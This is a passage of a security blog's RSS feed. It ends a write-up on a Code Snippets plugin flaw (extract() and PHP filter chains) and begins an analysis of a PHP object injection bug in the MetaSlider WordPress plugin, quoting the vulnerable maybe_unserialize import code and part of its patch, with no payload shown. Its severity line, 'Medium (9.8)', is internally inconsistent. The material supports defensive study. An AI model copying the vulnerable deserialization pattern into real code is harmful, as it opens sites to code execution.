&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in the Code Snippets plugin originates from using &lt;code&gt;extract()&lt;/code&gt; without protection, allowing internal variables to be overwritten and arbitrary file execution via &lt;code&gt;require_once&lt;/code&gt;. When combined with the â€œEnable file-based executionâ€ option and the &lt;code&gt;[code_snippet]&lt;/code&gt; shortcode, a Contributor-level user can trigger unintended PHP code execution. The patch mitigates this by using &lt;code&gt;EXTR_SKIP&lt;/code&gt;, ensuring sensitive variables are not overwritten during shortcode processing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;extract()&lt;/code&gt; without controlling variable names is highly risky, especially when input comes from users.&lt;/li&gt;&#xA;&lt;li&gt;PHP stream wrappers, including filter chains, can be powerful tools for converting data into executable code.&lt;/li&gt;&#xA;&lt;li&gt;A seemingly harmless option like â€œEnable file-based executionâ€ can significantly expand the attack surface.&lt;/li&gt;&#xA;&lt;li&gt;WordPress shortcodes must be carefully handled since Contributors can use them in post content.&lt;/li&gt;&#xA;&lt;li&gt;Adding &lt;code&gt;EXTR_SKIP&lt;/code&gt; in the patch is a simple but effective measure to prevent overwriting sensitive variables.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/code-snippets/vulnerability/wordpress-code-snippets-plugin-3-9-1-authenticated-contributor-php-code-injection-via-extract-and-php-filter-chains-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin &amp;lt;= 3.9.1 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26763 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-26-cve-2025-26763/</link>
      <pubDate>Wed, 26 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-26-cve-2025-26763/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;Deserialization of Untrusted Data vulnerability in MetaSlider Responsive Slider by MetaSlider allows Object Injection. This issue affects Responsive Slider by MetaSlider: from n/a through 3.94.0.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26763&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26763&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.94.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.95.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ml-slider/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.94.0&lt;/code&gt; â€“ &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.95.0&lt;/code&gt; â€“ &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; â†’ &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.94.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_slideshow_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;maybe_unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;{#ID#}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_slideshow_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; function is called directly on user-controlled data (&lt;code&gt;$value&lt;/code&gt;). Since these values are not validated before being unserialized, an attacker can inject malicious serialized payloads leading to PHP Object Injection.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patch (v3.95.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#34; title=&#34;Patch diff&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch diff&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/diff.png&#39; alt=&#34;Diff&#34; height=&#34;406&#34; width=&#34;1885&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch diff&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch adds two critical protections to prevent malicious data from being unserialized:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Block any meta value that is a serialized object (O:). If detected, the import process stops and the slideshow is deleted.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$slideshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;meta&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;@since&amp;ensp;3.95&amp;ensp;-&amp;ensp;Stop&amp;ensp;the&amp;ensp;process&amp;ensp;and&amp;ensp;cleanup&amp;ensp;if&amp;ensp;we&amp;ensp;catch&amp;ensp;non&amp;ensp;valid&amp;ensp;data&amp;ensp;in&amp;ensp;JSON&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_serialized&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;O:&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_trash_post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$new_slideshow_id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_Error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;import_slideshow_error&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Import&amp;ensp;file&amp;ensp;is&amp;ensp;invalid.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ml-slider&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_post_meta&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span 